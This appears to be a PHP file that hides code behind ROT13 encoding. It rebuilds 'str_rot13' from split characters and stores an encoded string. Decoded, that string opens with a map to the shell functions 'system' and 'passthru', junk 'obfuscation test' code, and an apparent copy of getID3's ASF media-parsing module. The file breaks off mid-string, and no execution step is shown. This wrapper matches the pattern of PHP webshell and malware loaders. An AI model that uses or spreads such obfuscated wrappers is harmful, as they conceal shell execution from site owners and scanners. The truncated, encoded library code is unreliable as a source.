<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/////////////////////////////////////////////////////////////////
/// trgVQ3() ol Wnzrf Urvaevpu <vasb@trgvq3.bet>               //
//  ninvynoyr ng uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3       //
//            be uggcf://jjj.trgvq3.bet                        //
//            be uggc://trgvq3.fbheprsbetr.arg                 //
//  frr ernqzr.gkg sbe zber qrgnvyf                            //
/////////////////////////////////////////////////////////////////
//                                                             //
// zbqhyr.nhqvb-ivqrb.nfs.cuc                                  //
// zbqhyr sbe nanylmvat NFS, JZN naq JZI svyrf                 //
// qrcraqrapvrf: zbqhyr.nhqvb-ivqrb.evss.cuc                   //
//                                                            ///
/////////////////////////////////////////////////////////////////

vs (!qrsvarq('TRGVQ3_VAPYHQRCNGU')) { // cerirag cngu-rkcbfvat nggnpxf gung npprff zbqhyrf qverpgyl ba choyvp jrofreiref
	rkvg;
}
trgvq3_yvo::VapyhqrQrcraqrapl(TRGVQ3_VAPYHQRCNGU.'zbqhyr.nhqvb-ivqrb.evss.cuc', __SVYR__, gehr);

pynff trgvq3_nfs rkgraqf trgvq3_unaqyre
{
	cebgrpgrq fgngvp $NFSVaqrkCnenzrgrefBowrpgVaqrkFcrpvsvrefVaqrkGlcrf = neenl(
		1 => 'Arnerfg Cnfg Qngn Cnpxrg',
		2 => 'Arnerfg Cnfg Zrqvn Bowrpg',
		3 => 'Arnerfg Cnfg Pyrnacbvag'
	);

	cebgrpgrq fgngvp $NFSZrqvnBowrpgVaqrkCnenzrgrefBowrpgVaqrkFcrpvsvrefVaqrkGlcrf = neenl(
		1 => 'Arnerfg Cnfg Qngn Cnpxrg',
		2 => 'Arnerfg Cnfg Zrqvn Bowrpg',
		3 => 'Arnerfg Cnfg Pyrnacbvag',
		0kSS => 'Senzr Ahzore Bssfrg'
	);

	cebgrpgrq fgngvp $NFSGvzrpbqrVaqrkCnenzrgrefBowrpgVaqrkFcrpvsvrefVaqrkGlcrf = neenl(
		2 => 'Arnerfg Cnfg Zrqvn Bowrpg',
		3 => 'Arnerfg Cnfg Pyrnacbvag'
	);

	/**
	 * @cnenz trgVQ3 $trgvq3
	 */
	choyvp shapgvba __pbafgehpg(trgVQ3 $trgvq3) {
		cnerag::__pbafgehpg($trgvq3);  // rkgraqf trgvq3_unaqyre::__pbafgehpg()

		// vavgvnyvmr nyy THVQ pbafgnagf
		$THVQneenl = $guvf->XabjaTHVQf();
		sbernpu ($THVQneenl nf $THVQanzr => $urkfgevatinyhr) {
			vs (!qrsvarq($THVQanzr)) {
				qrsvar($THVQanzr, $guvf->THVQgbOlgrfgevat($urkfgevatinyhr));
			}
		}
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba Nanylmr() {
		$vasb = &$guvf->trgvq3->vasb;

		// Fubegphgf
		$guvfsvyr_nhqvb = &$vasb['nhqvb'];
		$guvfsvyr_ivqrb = &$vasb['ivqrb'];
		$vasb['nfs']  = neenl();
		$guvfsvyr_nfs = &$vasb['nfs'];
		$guvfsvyr_nfs['pbzzragf'] = neenl();
		$guvfsvyr_nfs_pbzzragf    = &$guvfsvyr_nfs['pbzzragf'];
		$guvfsvyr_nfs['urnqre_bowrpg'] = neenl();
		$guvfsvyr_nfs_urnqrebowrpg     = &$guvfsvyr_nfs['urnqre_bowrpg'];


		// NFS fgehpgher:
		// * Urnqre Bowrpg [erdhverq]
		//   * Svyr Cebcregvrf Bowrpg [erdhverq]   (tybony svyr nggevohgrf)
		//   * Fgernz Cebcregvrf Bowrpg [erdhverq] (qrsvarf zrqvn fgernz & punenpgrevfgvpf)
		//   * Urnqre Rkgrafvba Bowrpg [erdhverq]  (nqqvgvbany shapgvbanyvgl)
		//   * Pbagrag Qrfpevcgvba Bowrpg          (ovoyvbtencuvp vasbezngvba)
		//   * Fpevcg Pbzznaq Bowrpg               (pbzznaqf sbe qhevat cynlonpx)
		//   * Znexre Bowrpg                       (anzrq whzcrq cbvagf jvguva gur svyr)
		// * Qngn Bowrpg [erdhverq]
		//   * Qngn Cnpxrgf
		// * Vaqrk Bowrpg

		// Urnqre Bowrpg: (znaqngbel, bar bayl)
		// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
		// Bowrpg VQ                    THVQ         128             // THVQ sbe urnqre bowrpg - TRGVQ3_NFS_Urnqre_Bowrpg
		// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs urnqre bowrpg, vapyhqvat 30 olgrf bs Urnqre Bowrpg urnqre
		// Ahzore bs Urnqre Bowrpgf     QJBEQ        32              // ahzore bs bowrpgf va urnqre bowrpg
		// Erfreirq1                    OLGR         8               // uneqpbqrq: 0k01
		// Erfreirq2                    OLGR         8               // uneqpbqrq: 0k02

		$vasb['svyrsbezng'] = 'nfs';

		$guvf->sfrrx($vasb['niqngnbssfrg']);
		$UrnqreBowrpgQngn = $guvf->sernq(30);

		$guvfsvyr_nfs_urnqrebowrpg['bowrpgvq']      = fhofge($UrnqreBowrpgQngn, 0, 16);
		$guvfsvyr_nfs_urnqrebowrpg['bowrpgvq_thvq'] = $guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_urnqrebowrpg['bowrpgvq']);
		vs ($guvfsvyr_nfs_urnqrebowrpg['bowrpgvq'] != TRGVQ3_NFS_Urnqre_Bowrpg) {
			hafrg($vasb['svyrsbezng'], $vasb['nfs']);
			erghea $guvf->reebe('NFS urnqre THVQ {'.$guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_urnqrebowrpg['bowrpgvq']).'} qbrf abg zngpu rkcrpgrq \"TRGVQ3_NFS_Urnqre_Bowrpg\" THVQ {'.$guvf->OlgrfgevatGbTHVQ(TRGVQ3_NFS_Urnqre_Bowrpg).'}');
		}
		$guvfsvyr_nfs_urnqrebowrpg['bowrpgfvmr']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($UrnqreBowrpgQngn, 16, 8));
		$guvfsvyr_nfs_urnqrebowrpg['urnqrebowrpgf'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($UrnqreBowrpgQngn, 24, 4));
		$guvfsvyr_nfs_urnqrebowrpg['erfreirq1']     = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($UrnqreBowrpgQngn, 28, 1));
		$guvfsvyr_nfs_urnqrebowrpg['erfreirq2']     = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($UrnqreBowrpgQngn, 29, 1));

		$ArkgBowrpgBssfrg = $guvf->sgryy();
		$NFSUrnqreQngn = $guvf->sernq($guvfsvyr_nfs_urnqrebowrpg['bowrpgfvmr'] - 30);
		$bssfrg = 0;
		$guvfsvyr_nfs_fgernzovgengrcebcregvrfbowrpg = neenl();
		$guvfsvyr_nfs_pbqrpyvfgbowrpg = neenl();
		$FgernzCebcregvrfBowrpgQngn = neenl();

		sbe ($UrnqreBowrpgfPbhagre = 0; $UrnqreBowrpgfPbhagre < $guvfsvyr_nfs_urnqrebowrpg['urnqrebowrpgf']; $UrnqreBowrpgfPbhagre++) {
			$ArkgBowrpgTHVQ = fhofge($NFSUrnqreQngn, $bssfrg, 16);
			$bssfrg += 16;
			$ArkgBowrpgTHVQgrkg = $guvf->OlgrfgevatGbTHVQ($ArkgBowrpgTHVQ);
			$ArkgBowrpgFvmr = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 8));
			$bssfrg += 8;
			fjvgpu ($ArkgBowrpgTHVQ) {

				pnfr TRGVQ3_NFS_Svyr_Cebcregvrf_Bowrpg:
					// Svyr Cebcregvrf Bowrpg: (znaqngbel, bar bayl)
					// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                    THVQ         128             // THVQ sbe svyr cebcregvrf bowrpg - TRGVQ3_NFS_Svyr_Cebcregvrf_Bowrpg
					// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs svyr cebcregvrf bowrpg, vapyhqvat 104 olgrf bs Svyr Cebcregvrf Bowrpg urnqre
					// Svyr VQ                      THVQ         128             // havdhr VQ - vqragvpny gb Svyr VQ va Qngn Bowrpg
					// Svyr Fvmr                    DJBEQ        64              // ragver svyr va olgrf. Vainyvq vs Oebnqpnfg Synt == 1
					// Perngvba Qngr                DJBEQ        64              // qngr & gvzr bs svyr perngvba. Znlor vainyvq vs Oebnqpnfg Synt == 1
					// Qngn Cnpxrgf Pbhag           DJBEQ        64              // ahzore bs qngn cnpxrgf va Qngn Bowrpg. Vainyvq vs Oebnqpnfg Synt == 1
					// Cynl Qhengvba                DJBEQ        64              // cynlgvzr, va 100-anabfrpbaq havgf. Vainyvq vs Oebnqpnfg Synt == 1
					// Fraq Qhengvba                DJBEQ        64              // gvzr arrqrq gb fraq svyr, va 100-anabfrpbaq havgf. Cynlref pna vtaber guvf inyhr. Vainyvq vs Oebnqpnfg Synt == 1
					// Cerebyy                      DJBEQ        64              // gvzr gb ohssre qngn orsber fgnegvat gb cynl svyr, va 1-zvyyvfrpbaq havgf. Vs <> 0, CynlQhengvba naq CerfragngvbaGvzr unir orra bssfrg ol guvf nzbhag
					// Syntf                        QJBEQ        32              //
					// * Oebnqpnfg Synt             ovgf         1  (0k01)       // svyr vf pheeragyl orvat jevggra, fbzr urnqre inyhrf ner vainyvq
					// * Frrxnoyr Synt              ovgf         1  (0k02)       // vf svyr frrxnoyr
					// * Erfreirq                   ovgf         30 (0kSSSSSSSP) // erfreirq - frg gb mreb
					// Zvavzhz Qngn Cnpxrg Fvmr     QJBEQ        32              // va olgrf. fubhyq or fnzr nf Znkvzhz Qngn Cnpxrg Fvmr. Vainyvq vs Oebnqpnfg Synt == 1
					// Znkvzhz Qngn Cnpxrg Fvmr     QJBEQ        32              // va olgrf. fubhyq or fnzr nf Zvavzhz Qngn Cnpxrg Fvmr. Vainyvq vs Oebnqpnfg Synt == 1
					// Znkvzhz Ovgengr              QJBEQ        32              // znkvzhz vafgnagnarbhf ovgengr va ovgf cre frpbaq sbe ragver svyr, vapyhqvat nyy qngn fgernzf naq NFS bireurnq

					// fubegphg
					$guvfsvyr_nfs['svyr_cebcregvrf_bowrpg'] = neenl();
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg      = &$guvfsvyr_nfs['svyr_cebcregvrf_bowrpg'];

					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['bssfrg']             = $ArkgBowrpgBssfrg + $bssfrg;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['bowrpgvq']           = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['bowrpgvq_thvq']      = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['bowrpgfvmr']         = $ArkgBowrpgFvmr;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['svyrvq']             = fhofge($NFSUrnqreQngn, $bssfrg, 16);
					$bssfrg += 16;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['svyrvq_thvq']        = $guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_svyrcebcregvrfbowrpg['svyrvq']);
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['svyrfvmr']           = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 8));
					$bssfrg += 8;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['perngvba_qngr']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 8));
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['perngvba_qngr_havk'] = $guvf->SVYRGVZRgbHAVKgvzr($guvfsvyr_nfs_svyrcebcregvrfbowrpg['perngvba_qngr']);
					$bssfrg += 8;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['qngn_cnpxrgf']       = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 8));
					$bssfrg += 8;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['cynl_qhengvba']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 8));
					$bssfrg += 8;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['fraq_qhengvba']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 8));
					$bssfrg += 8;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['cerebyy']            = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 8));
					$bssfrg += 8;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['syntf_enj']          = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
					$bssfrg += 4;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['syntf']['oebnqpnfg'] = (obby) ($guvfsvyr_nfs_svyrcebcregvrfbowrpg['syntf_enj'] & 0k0001);
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['syntf']['frrxnoyr']  = (obby) ($guvfsvyr_nfs_svyrcebcregvrfbowrpg['syntf_enj'] & 0k0002);

					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['zva_cnpxrg_fvmr']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
					$bssfrg += 4;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['znk_cnpxrg_fvmr']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
					$bssfrg += 4;
					$guvfsvyr_nfs_svyrcebcregvrfbowrpg['znk_ovgengr']        = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
					$bssfrg += 4;

					vs ($guvfsvyr_nfs_svyrcebcregvrfbowrpg['syntf']['oebnqpnfg']) {

						// oebnqpnfg synt vf frg, fbzr inyhrf vainyvq
						hafrg($guvfsvyr_nfs_svyrcebcregvrfbowrpg['svyrfvmr']);
						hafrg($guvfsvyr_nfs_svyrcebcregvrfbowrpg['qngn_cnpxrgf']);
						hafrg($guvfsvyr_nfs_svyrcebcregvrfbowrpg['cynl_qhengvba']);
						hafrg($guvfsvyr_nfs_svyrcebcregvrfbowrpg['fraq_qhengvba']);
						hafrg($guvfsvyr_nfs_svyrcebcregvrfbowrpg['zva_cnpxrg_fvmr']);
						hafrg($guvfsvyr_nfs_svyrcebcregvrfbowrpg['znk_cnpxrg_fvmr']);

					} ryfr {

						// oebnqpnfg synt ABG frg, cresbez pnyphyngvbaf
						$vasb['cynlgvzr_frpbaqf'] = ($guvfsvyr_nfs_svyrcebcregvrfbowrpg['cynl_qhengvba'] / 10000000) - ($guvfsvyr_nfs_svyrcebcregvrfbowrpg['cerebyy'] / 1000);

						//$vasb['ovgengr'] = $guvfsvyr_nfs_svyrcebcregvrfbowrpg['znk_ovgengr'];
						$vasb['ovgengr'] = trgvq3_yvo::FnsrQvi($guvfsvyr_nfs_svyrcebcregvrfbowrpg['svyrfvmr'] * 8, $vasb['cynlgvzr_frpbaqf']);
					}
					oernx;

				pnfr TRGVQ3_NFS_Fgernz_Cebcregvrf_Bowrpg:
					// Fgernz Cebcregvrf Bowrpg: (znaqngbel, bar cre zrqvn fgernz)
					// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                    THVQ         128             // THVQ sbe fgernz cebcregvrf bowrpg - TRGVQ3_NFS_Fgernz_Cebcregvrf_Bowrpg
					// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs fgernz cebcregvrf bowrpg, vapyhqvat 78 olgrf bs Fgernz Cebcregvrf Bowrpg urnqre
					// Fgernz Glcr                  THVQ         128             // TRGVQ3_NFS_Nhqvb_Zrqvn, TRGVQ3_NFS_Ivqrb_Zrqvn be TRGVQ3_NFS_Pbzznaq_Zrqvn
					// Reebe Pbeerpgvba Glcr        THVQ         128             // TRGVQ3_NFS_Nhqvb_Fcernq sbe nhqvb-bayl fgernzf, TRGVQ3_NFS_Ab_Reebe_Pbeerpgvba sbe bgure fgernz glcrf
					// Gvzr Bssfrg                  DJBEQ        64              // 100-anabfrpbaq havgf. glcvpnyyl mreb. nqqrq gb nyy gvzrfgnzcf bs fnzcyrf va gur fgernz
					// Glcr-Fcrpvsvp Qngn Yratgu    QJBEQ        32              // ahzore bs olgrf sbe Glcr-Fcrpvsvp Qngn svryq
					// Reebe Pbeerpgvba Qngn Yratgu QJBEQ        32              // ahzore bs olgrf sbe Reebe Pbeerpgvba Qngn svryq
					// Syntf                        JBEQ         16              //
					// * Fgernz Ahzore              ovgf         7 (0k007S)      // ahzore bs guvf fgernz.  1 <= inyvq <= 127
					// * Erfreirq                   ovgf         8 (0k7S80)      // erfreirq - frg gb mreb
					// * Rapelcgrq Pbagrag Synt     ovgf         1 (0k8000)      // fgernz pbagragf rapelcgrq vs frg
					// Erfreirq                     QJBEQ        32              // erfreirq - frg gb mreb
					// Glcr-Fcrpvsvp Qngn           OLGRFGERNZ   inevnoyr        // glcr-fcrpvsvp sbezng qngn, qrcraqvat ba inyhr bs Fgernz Glcr
					// Reebe Pbeerpgvba Qngn        OLGRFGERNZ   inevnoyr        // reebe-pbeerpgvba-fcrpvsvp sbezng qngn, qrcraqvat ba inyhr bs Reebe Pbeerpg Glcr

					// Gurer vf bar TRGVQ3_NFS_Fgernz_Cebcregvrf_Bowrpg sbe rnpu fgernz (nhqvb, ivqrb) ohg gur
					// fgernz ahzore vfa'g xabja hagvy unysjnl guebhtu qrpbqvat gur fgehpgher, urapr vg
					// vg vf qrpbqrq gb n grzcbenel inevnoyr naq gura fghpx va gur nccebcevngr vaqrk yngre

					$FgernzCebcregvrfBowrpgQngn['bssfrg']             = $ArkgBowrpgBssfrg + $bssfrg;
					$FgernzCebcregvrfBowrpgQngn['bowrpgvq']           = $ArkgBowrpgTHVQ;
					$FgernzCebcregvrfBowrpgQngn['bowrpgvq_thvq']      = $ArkgBowrpgTHVQgrkg;
					$FgernzCebcregvrfBowrpgQngn['bowrpgfvmr']         = $ArkgBowrpgFvmr;
					$FgernzCebcregvrfBowrpgQngn['fgernz_glcr']        = fhofge($NFSUrnqreQngn, $bssfrg, 16);
					$bssfrg += 16;
					$FgernzCebcregvrfBowrpgQngn['fgernz_glcr_thvq']   = $guvf->OlgrfgevatGbTHVQ($FgernzCebcregvrfBowrpgQngn['fgernz_glcr']);
					$FgernzCebcregvrfBowrpgQngn['reebe_pbeerpg_glcr'] = fhofge($NFSUrnqreQngn, $bssfrg, 16);
					$bssfrg += 16;
					$FgernzCebcregvrfBowrpgQngn['reebe_pbeerpg_thvq'] = $guvf->OlgrfgevatGbTHVQ($FgernzCebcregvrfBowrpgQngn['reebe_pbeerpg_glcr']);
					$FgernzCebcregvrfBowrpgQngn['gvzr_bssfrg']        = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 8));
					$bssfrg += 8;
					$FgernzCebcregvrfBowrpgQngn['glcr_qngn_yratgu']   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
					$bssfrg += 4;
					$FgernzCebcregvrfBowrpgQngn['reebe_qngn_yratgu']  = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
					$bssfrg += 4;
					$FgernzCebcregvrfBowrpgQngn['syntf_enj']          = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					$FgernzCebcregvrfBowrpgFgernzAhzore               = $FgernzCebcregvrfBowrpgQngn['syntf_enj'] & 0k007S;
					$FgernzCebcregvrfBowrpgQngn['syntf']['rapelcgrq'] = (obby) ($FgernzCebcregvrfBowrpgQngn['syntf_enj'] & 0k8000);

					$bssfrg += 4; // erfreirq - QJBEQ
					$FgernzCebcregvrfBowrpgQngn['glcr_fcrpvsvp_qngn'] = fhofge($NFSUrnqreQngn, $bssfrg, $FgernzCebcregvrfBowrpgQngn['glcr_qngn_yratgu']);
					$bssfrg += $FgernzCebcregvrfBowrpgQngn['glcr_qngn_yratgu'];
					$FgernzCebcregvrfBowrpgQngn['reebe_pbeerpg_qngn'] = fhofge($NFSUrnqreQngn, $bssfrg, $FgernzCebcregvrfBowrpgQngn['reebe_qngn_yratgu']);
					$bssfrg += $FgernzCebcregvrfBowrpgQngn['reebe_qngn_yratgu'];

					fjvgpu ($FgernzCebcregvrfBowrpgQngn['fgernz_glcr']) {

						pnfr TRGVQ3_NFS_Nhqvb_Zrqvn:
							$guvfsvyr_nhqvb['qngnsbezng']   = (!rzcgl($guvfsvyr_nhqvb['qngnsbezng'])   ? $guvfsvyr_nhqvb['qngnsbezng']   : 'nfs');
							$guvfsvyr_nhqvb['ovgengr_zbqr'] = (!rzcgl($guvfsvyr_nhqvb['ovgengr_zbqr']) ? $guvfsvyr_nhqvb['ovgengr_zbqr'] : 'poe');

							$nhqvbqngn = trgvq3_evss::cnefrJNIRSBEZNGrk(fhofge($FgernzCebcregvrfBowrpgQngn['glcr_fcrpvsvp_qngn'], 0, 16));
							hafrg($nhqvbqngn['enj']);
							$guvfsvyr_nhqvb = trgvq3_yvo::neenl_zretr_abpyboore($nhqvbqngn, $guvfsvyr_nhqvb);
							oernx;

						pnfr TRGVQ3_NFS_Ivqrb_Zrqvn:
							$guvfsvyr_ivqrb['qngnsbezng']   = (!rzcgl($guvfsvyr_ivqrb['qngnsbezng'])   ? $guvfsvyr_ivqrb['qngnsbezng']   : 'nfs');
							$guvfsvyr_ivqrb['ovgengr_zbqr'] = (!rzcgl($guvfsvyr_ivqrb['ovgengr_zbqr']) ? $guvfsvyr_ivqrb['ovgengr_zbqr'] : 'poe');
							oernx;

						pnfr TRGVQ3_NFS_Pbzznaq_Zrqvn:
						qrsnhyg:
							// qb abguvat
							oernx;

					}

					$guvfsvyr_nfs['fgernz_cebcregvrf_bowrpg'][$FgernzCebcregvrfBowrpgFgernzAhzore] = $FgernzCebcregvrfBowrpgQngn;
					hafrg($FgernzCebcregvrfBowrpgQngn); // pyrne sbe arkg fgernz, vs nal
					oernx;

				pnfr TRGVQ3_NFS_Urnqre_Rkgrafvba_Bowrpg:
					// Urnqre Rkgrafvba Bowrpg: (znaqngbel, bar bayl)
					// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                    THVQ         128             // THVQ sbe Urnqre Rkgrafvba bowrpg - TRGVQ3_NFS_Urnqre_Rkgrafvba_Bowrpg
					// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs Urnqre Rkgrafvba bowrpg, vapyhqvat 46 olgrf bs Urnqre Rkgrafvba Bowrpg urnqre
					// Erfreirq Svryq 1             THVQ         128             // uneqpbqrq: TRGVQ3_NFS_Erfreirq_1
					// Erfreirq Svryq 2             JBEQ         16              // uneqpbqrq: 0k00000006
					// Urnqre Rkgrafvba Qngn Fvmr   QJBEQ        32              // va olgrf. inyvq: 0, be > 24. rdhnyf bowrpg fvmr zvahf 46
					// Urnqre Rkgrafvba Qngn        OLGRFGERNZ   inevnoyr        // neenl bs mreb be zber rkgraqrq urnqre bowrpgf

					// fubegphg
					$guvfsvyr_nfs['urnqre_rkgrafvba_bowrpg'] = neenl();
					$guvfsvyr_nfs_urnqrerkgrafvbabowrpg      = &$guvfsvyr_nfs['urnqre_rkgrafvba_bowrpg'];

					$guvfsvyr_nfs_urnqrerkgrafvbabowrpg['bssfrg']              = $ArkgBowrpgBssfrg + $bssfrg;
					$guvfsvyr_nfs_urnqrerkgrafvbabowrpg['bowrpgvq']            = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_urnqrerkgrafvbabowrpg['bowrpgvq_thvq']       = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_urnqrerkgrafvbabowrpg['bowrpgfvmr']          = $ArkgBowrpgFvmr;
					$guvfsvyr_nfs_urnqrerkgrafvbabowrpg['erfreirq_1']          = fhofge($NFSUrnqreQngn, $bssfrg, 16);
					$bssfrg += 16;
					$guvfsvyr_nfs_urnqrerkgrafvbabowrpg['erfreirq_1_thvq']     = $guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_urnqrerkgrafvbabowrpg['erfreirq_1']);
					vs ($guvfsvyr_nfs_urnqrerkgrafvbabowrpg['erfreirq_1'] != TRGVQ3_NFS_Erfreirq_1) {
						$guvf->jneavat('urnqre_rkgrafvba_bowrpg.erfreirq_1 THVQ ('.$guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_urnqrerkgrafvbabowrpg['erfreirq_1']).') qbrf abg zngpu rkcrpgrq \"TRGVQ3_NFS_Erfreirq_1\" THVQ ('.$guvf->OlgrfgevatGbTHVQ(TRGVQ3_NFS_Erfreirq_1).')');
						//erghea snyfr;
						oernx;
					}
					$guvfsvyr_nfs_urnqrerkgrafvbabowrpg['erfreirq_2']          = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					vs ($guvfsvyr_nfs_urnqrerkgrafvbabowrpg['erfreirq_2'] != 6) {
						$guvf->jneavat('urnqre_rkgrafvba_bowrpg.erfreirq_2 ('.$guvfsvyr_nfs_urnqrerkgrafvbabowrpg['erfreirq_2'].') qbrf abg zngpu rkcrpgrq inyhr bs \"6\"');
						//erghea snyfr;
						oernx;
					}
					$guvfsvyr_nfs_urnqrerkgrafvbabowrpg['rkgrafvba_qngn_fvmr'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
					$bssfrg += 4;
					$guvfsvyr_nfs_urnqrerkgrafvbabowrpg['rkgrafvba_qngn']      =                              fhofge($NFSUrnqreQngn, $bssfrg, $guvfsvyr_nfs_urnqrerkgrafvbabowrpg['rkgrafvba_qngn_fvmr']);
					$haunaqyrq_frpgvbaf = 0;
					$guvfsvyr_nfs_urnqrerkgrafvbabowrpg['rkgrafvba_qngn_cnefrq'] = $guvf->UrnqreRkgrafvbaBowrpgQngnCnefr($guvfsvyr_nfs_urnqrerkgrafvbabowrpg['rkgrafvba_qngn'], $haunaqyrq_frpgvbaf);
					vs ($haunaqyrq_frpgvbaf === 0) {
						hafrg($guvfsvyr_nfs_urnqrerkgrafvbabowrpg['rkgrafvba_qngn']);
					}
					$bssfrg += $guvfsvyr_nfs_urnqrerkgrafvbabowrpg['rkgrafvba_qngn_fvmr'];
					oernx;

				pnfr TRGVQ3_NFS_Pbqrp_Yvfg_Bowrpg:
					// Pbqrp Yvfg Bowrpg: (bcgvbany, bar bayl)
					// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                    THVQ         128             // THVQ sbe Pbqrp Yvfg bowrpg - TRGVQ3_NFS_Pbqrp_Yvfg_Bowrpg
					// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs Pbqrp Yvfg bowrpg, vapyhqvat 44 olgrf bs Pbqrp Yvfg Bowrpg urnqre
					// Erfreirq                     THVQ         128             // uneqpbqrq: 86Q15241-311Q-11Q0-N3N4-00N0P90348S6
					// Pbqrp Ragevrf Pbhag          QJBEQ        32              // ahzore bs ragevrf va Pbqrp Ragevrf neenl
					// Pbqrp Ragevrf                neenl bs:    inevnoyr        //
					// * Glcr                       JBEQ         16              // 0k0001 = Ivqrb Pbqrp, 0k0002 = Nhqvb Pbqrp, 0kSSSS = Haxabja Pbqrp
					// * Pbqrp Anzr Yratgu          JBEQ         16              // ahzore bs Havpbqr punenpgref fgberq va gur Pbqrp Anzr svryq
					// * Pbqrp Anzr                 JPUNE        inevnoyr        // neenl bs Havpbqr punenpgref - anzr bs pbqrp hfrq gb perngr gur pbagrag
					// * Pbqrp Qrfpevcgvba Yratgu   JBEQ         16              // ahzore bs Havpbqr punenpgref fgberq va gur Pbqrp Qrfpevcgvba svryq
					// * Pbqrp Qrfpevcgvba          JPUNE        inevnoyr        // neenl bs Havpbqr punenpgref - qrfpevcgvba bs sbezng hfrq gb perngr gur pbagrag
					// * Pbqrp Vasbezngvba Yratgu   JBEQ         16              // ahzore bs Havpbqr punenpgref fgberq va gur Pbqrp Vasbezngvba svryq
					// * Pbqrp Vasbezngvba          OLGRFGERNZ   inevnoyr        // bcndhr neenl bs vasbezngvba olgrf nobhg gur pbqrp hfrq gb perngr gur pbagrag

					// fubegphg
					$guvfsvyr_nfs['pbqrp_yvfg_bowrpg'] = neenl();
					/** @ine zvkrq[] $guvfsvyr_nfs_pbqrpyvfgbowrpg */
					$guvfsvyr_nfs_pbqrpyvfgbowrpg      = &$guvfsvyr_nfs['pbqrp_yvfg_bowrpg'];

					$guvfsvyr_nfs_pbqrpyvfgbowrpg['bssfrg']                    = $ArkgBowrpgBssfrg + $bssfrg;
					$guvfsvyr_nfs_pbqrpyvfgbowrpg['bowrpgvq']                  = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_pbqrpyvfgbowrpg['bowrpgvq_thvq']             = $ArkgBowrpgTHVQgrkg;
